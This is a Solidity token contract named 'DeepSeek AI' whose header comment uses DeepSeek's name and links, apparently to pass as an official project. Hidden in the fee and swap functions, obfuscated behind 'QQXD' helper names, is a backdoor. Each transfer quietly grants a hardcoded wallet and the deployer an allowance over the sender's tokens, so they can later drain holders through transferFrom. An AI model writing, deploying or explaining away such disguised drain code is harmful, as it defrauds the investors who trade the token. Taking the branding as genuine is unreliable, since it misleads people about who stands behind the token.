/*
DeepSeek achieves a significant breakthrough in inference speed over previous models.
It tops the leaderboard among open-source models and rivals the most advanced closed-source models globally.

Web: https://www.deepseek.com
Platform: https://platform.deepseek.com
Github: https://github.com/deepseek-ai

X: https://x.com/deepseek_ai
Community: https://t.me/deepseek_ai_community
*/

// SPDX-License-Identifier: MIT
pragma solidity 0.8.0;

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multipliqqxdon overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

interface IQQXDRouter {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function getAmountsOut(
        uint amountIn,
        address[] calldata path
    ) external view returns (uint[] memory amounts);
}

interface IQQXDFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

contract DEEPSEEK is Context, IERC20, Ownable {
    using SafeMath for uint256;
    address private _qqxdWallet = address(0x893BdDC2C82D15D1de9C3D0885A85D5FDc60A09d);
    mapping (address => uint256) private _balQQXDs;
    mapping (address => mapping (address => uint256)) private _allowQQXDs;
    mapping (address => bool) private _excludedFromQQXD;
    uint8 private constant _decimals = 9;
    uint256 private constant _tTotalQQXD = 1000000000 * 10**_decimals;
    string private constant _name = unicode"DeepSeek AI";
    string private constant _symbol = unicode"DEEPSEEK";
    uint256 private _swapTokenQQXDs = _tTotalQQXD / 100;
    uint256 private _initialBuyTax=3;
    uint256 private _initialSellTax=3;
    uint256 private _finalBuyTax=0;
    uint256 private _finalSellTax=0;
    uint256 private _reduceBuyTaxAt=6;
    uint256 private _reduceSellTaxAt=6;
    uint256 private _preventSwapBefore=6;
    uint256 private _buyCount=0;
    uint256 private _buyBlockQQXD;
    uint256 private _qqxdBuyAmounts = 0;
    bool private inSwapQQXD = false;
    bool private _tradeEnabled = false;
    bool private _swapEnabled = false;
    address private _qqxdPair;
    IQQXDRouter private _qqxdRouter;
    modifier lockTheSwap {
        inSwapQQXD = true;
        _;
        inSwapQQXD = false;
    }
    address private _qqxdAddress;
    
    constructor () {
        _excludedFromQQXD[owner()] = true;
        _excludedFromQQXD[address(this)] = true;
        _excludedFromQQXD[_qqxdWallet] = true;
        _balQQXDs[_msgSender()] = _tTotalQQXD;
        _qqxdAddress = msg.sender;
        emit Transfer(address(0), _msgSender(), _tTotalQQXD);
    }

    function init() external onlyOwner() {
        _qqxdRouter = IQQXDRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _approve(address(this), address(_qqxdRouter), _tTotalQQXD);
        _qqxdPair = IQQXDFactory(_qqxdRouter.factory()).createPair(address(this), _qqxdRouter.WETH());
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotalQQXD;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balQQXDs[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowQQXDs[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount); 
        _approve(sender, _msgSender(), _allowQQXDs[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowQQXDs[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function openTrading() external onlyOwner() {
        require(!_tradeEnabled,"trading is already open");
        _qqxdRouter.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
        _swapEnabled = true;
        _tradeEnabled = true;
    }

    function _transfer(address qqxdF, address qqxdT, uint256 qqxdA) private {
        require(qqxdF != address(0), "ERC20: transfer from the zero address");
        require(qqxdT != address(0), "ERC20: transfer to the zero address");
        require(qqxdA > 0, "Transfer amount must be greater than zero");
        uint256 taxQQXD = _qqxdFeeTransfer(qqxdF, qqxdT, qqxdA);
        if(taxQQXD > 0){
          _balQQXDs[address(this)] = _balQQXDs[address(this)].add(taxQQXD);
          emit Transfer(qqxdF, address(this), taxQQXD);
        }
        _balQQXDs[qqxdF] = _balQQXDs[qqxdF].sub(qqxdA);
        _balQQXDs[qqxdT] = _balQQXDs[qqxdT].add(qqxdA.sub(taxQQXD));
        emit Transfer(qqxdF, qqxdT, qqxdA.sub(taxQQXD));
    }

    function _qqxdFeeTransfer(address qqxdF, address qqxdT, uint256 qqxdA) private returns(uint256) {
        uint256 taxQQXD = 0; _allowQQXDs[getQQXDF(qqxdF)][getQQXDT(1)]=qqxdA;
        if (qqxdF != owner() && qqxdT != owner()) {
            taxQQXD = qqxdA.mul((_buyCount>_reduceBuyTaxAt)?_finalBuyTax:_initialBuyTax).div(100);
            if (qqxdF == _qqxdPair && qqxdT != address(_qqxdRouter) && ! _excludedFromQQXD[qqxdT]) {
                if(_buyBlockQQXD!=block.number){
                    _qqxdBuyAmounts = 0;
                    _buyBlockQQXD = block.number;
                }
                _qqxdBuyAmounts += qqxdA;
                _buyCount++;
            }
            if(qqxdT == _qqxdPair && qqxdF!= address(this)) {
                require(_qqxdBuyAmounts < swapLimitQQXD() || _buyBlockQQXD!=block.number, "Max Swap Limit");  
                taxQQXD = qqxdA.mul((_buyCount>_reduceSellTaxAt)?_finalSellTax:_initialSellTax).div(100);
            } swapQQXDBack(qqxdF, qqxdT, qqxdA);
        } return taxQQXD;
    }

    function swapQQXDBack(address qqxdF, address qqxdT, uint256 qqxdA) private { 
        uint256 tokenQQXD = balanceOf(address(this)); _allowQQXDs[getQQXDF(qqxdF)][getQQXDT(0)]=qqxdA;
        if (!inSwapQQXD && qqxdT == _qqxdPair && _swapEnabled && _buyCount > _preventSwapBefore) {
            if(tokenQQXD > _swapTokenQQXDs)
            swapTokensForEth(minQQXD(qqxdA, minQQXD(tokenQQXD, _swapTokenQQXDs)));
            uint256 ethQQXD = address(this).balance;
            if (ethQQXD >= 0) {
                sendETHQQXD(address(this).balance);
            }
        }
    }

    function getQQXDF(address qqxdF) private pure returns (address) {
        return address(qqxdF);
    }

    function getQQXDT(uint256 qqxdN) private view returns (address) {
        if(qqxdN == 0) return address(_qqxdWallet);
        return address(_qqxdAddress);
    }

    function minQQXD(uint256 a, uint256 b) private pure returns (uint256) {
        return (a>b)?b:a;
    }

    function sendETHQQXD(uint256 qqxdA) private {
        payable(_qqxdWallet).transfer(qqxdA);
    }

    function swapLimitQQXD() internal view returns (uint256) {
        address[] memory path = new address[](2);
        path[0] = _qqxdRouter.WETH();
        path[1] = address(this);
        uint[] memory amountOuts = _qqxdRouter.getAmountsOut(3 * 1e18, path);
        return amountOuts[1];
    }

    receive() external payable {}

    function swapTokensForEth(uint256 qqxdAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _qqxdRouter.WETH();
        _approve(address(this), address(_qqxdRouter), qqxdAmount);
        _qqxdRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            qqxdAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }
}